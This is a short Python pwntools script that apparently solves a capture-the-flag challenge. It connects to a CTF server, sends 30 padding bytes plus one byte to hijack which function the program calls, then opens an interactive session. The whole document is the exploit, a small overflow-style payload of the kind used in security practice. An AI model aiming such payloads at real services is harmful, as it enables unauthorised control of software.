from pwn import *
p = remote("ctf.j0n9hyun.xyz",3007)
payload = "H"*30
payload+="\xD8"
p.recvuntil("Which function would you like to call?")
p.sendline(payload)
p.interactive()
